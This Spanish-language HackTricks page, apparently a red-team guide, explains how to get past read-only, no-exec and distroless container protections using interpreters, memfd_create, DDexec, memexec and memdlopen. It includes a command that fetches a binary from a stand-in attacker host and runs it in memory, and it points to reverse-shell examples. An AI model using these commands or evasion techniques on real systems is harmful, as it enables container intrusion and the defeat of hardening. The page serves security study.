# Bypass FS protections: read-only / no-exec / Distroless

## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas con más detalle:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## escenario de read-only / no-exec

En un contenedor, puedes montar el sistema de archivos raíz como read-only estableciendo **`readOnlyRootFilesystem: true`** en el security context.<sup>[[3]](#references)</sup> Por ejemplo:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Un root read-only no hace que los volúmenes montados por separado sean read-only. Docker trata **`/dev/shm`** como un mount de IPC, mientras que opciones de tmpfs como `rw` y `noexec` son decisiones de configuración en runtime; inspecciona las opciones de mount del contenedor objetivo antes de confiar en cualquiera de estos comportamientos.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Desde una perspectiva de red-team, esa combinación puede dificultar la descarga y ejecución de binaries que no estén disponibles previamente (por ejemplo, backdoors o herramientas de enumeración).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass más sencillo: Scripts

Un mount `noexec` bloquea la ejecución directa de binaries en ese mount, pero un interpreter todavía puede leer e interpretar un script. Por lo tanto, si `sh` o `python` están presentes, puedes ejecutar un shell o un script de Python mediante ese interpreter.<sup>[[5]](#references)</sup>

Esto no sirve cuando la herramienta necesaria es en sí misma un binary.<sup>[[5]](#references)</sup>

## Bypasses de memoria

Cuando la ejecución directa desde un path montado está bloqueada, una opción es cargar el ELF en memoria y ejecutarlo mediante un path en memoria. Esto evita la comprobación `noexec` en ese mount, pero no elimina otros controles del kernel, de permisos o de políticas.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass de FD + syscall exec

Si un scripting runtime puede acceder a la interfaz de Linux correspondiente, puede crear un file descriptor anónimo respaldado por RAM con **`memfd_create(2)`**, escribir los bytes del ELF en él y utilizar un mecanismo de ejecución respaldado por fd. El proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genera código comprimido y codificado en base64 de Python, Perl o Ruby para este workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Actualmente, el proyecto documenta targets de Python, Perl y Ruby; PHP o Node necesitan una técnica o extensión específica para ese runtime, por lo que la ausencia de este generador para un lenguaje no significa que la ejecución en memoria sea imposible.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Un executable normal escrito en **`/dev/shm`** sigue estando sujeto a la configuración **`noexec`** de ese mount; abrirlo mediante un file descriptor normal no cambia la política del mount.<sup>[[5]](#references)</sup>
>
> El método exacto de ejecución en memoria también depende del runtime, la arquitectura, el kernel y los permisos disponibles.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) escribe un stager y un loader en el proceso de shell en ejecución mediante **`/proc/self/mem`**, y después transfiere el control a ese código.<sup>[[8]](#references)</sup>

Esto permite al proceso cargar un binary proporcionado sin colocar primero ese binary en un sistema de archivos executable.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** puede cargar y **execute** shellcode o un binary desde la **memoria**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obtener más información sobre esta técnica, consulta GitHub o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es una implementación daemonizada de DDexec. Su daemon escucha solicitudes que contienen argumentos y bytes sin procesar del programa, hace fork de un proceso hijo para cargar y ejecutar cada programa, y mantiene el proceso padre como servidor.<sup>[[9]](#references)</sup>

El repositorio incluye un ejemplo del uso de **memexec para ejecutar binarios desde un PHP reverse shell** en [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Con un propósito similar al de DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) es una implementación fileless de `dlopen()` para un objeto compartido o un programa. Actualmente, su README documenta compatibilidad con ARM64, así que comprueba la arquitectura objetivo antes de usarlo.<sup>[[10]](#references)</sup>

## Distroless Bypass

Para obtener una explicación específica de **qué es realmente distroless**, cuándo resulta útil, cuándo no y cómo cambia el post-exploitation tradecraft en contenedores, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qué es distroless

Las imágenes distroless contienen únicamente la aplicación y sus dependencias de runtime; las imágenes oficiales omiten los package managers, shells y otros programas esperados en una distribución estándar de Linux.<sup>[[11]](#references)</sup>

Mantener la imagen de runtime limitada a esas dependencias reduce el software presente en producción y la cantidad que debe escanearse y monitorizarse.<sup>[[11]](#references)</sup>

### Reverse Shell

En un contenedor distroless es posible que **no encuentres `sh` o `bash`** para obtener un shell normal, ni utilidades comunes como `ls`, `whoami` o `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Por lo tanto, un reverse shell habitual basado en shell o una enumeración basada en utilidades podrían no funcionar.<sup>[[11]](#references)</sup>

Si la aplicación comprometida incluye un lenguaje de programación en su runtime (por ejemplo, Python para una aplicación Flask o Node.js para una aplicación Node), un RCE aún podría utilizar ese runtime para establecer un canal de comandos e inspeccionar el sistema mediante sus APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Utiliza el lenguaje de scripting disponible para **enumerar el sistema** mediante sus capacidades.<sup>[[12]](#references)</sup>

Si no existen protecciones **read-only/no-exec**, un canal de comandos podría escribir binarios en un mount escribible y ejecutable, y ejecutarlos; comprueba primero las opciones y los permisos del mount.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Cuando estas protecciones están presentes, utiliza las **técnicas de ejecución en memoria anteriores** cuando el runtime, el kernel y los permisos lo permitan.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Puedes encontrar **ejemplos** de explotación de vulnerabilidades RCE para obtener **reverse shells** en lenguajes de scripting y ejecutar binarios desde memoria en [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Explorando la manipulación de memoria de Linux para el sigilo y la evasión](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusiones sigilosas con DDexec-ng y dlopen() en memoria - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurar un contexto de seguridad para un Pod o contenedor](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - página del manual de Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
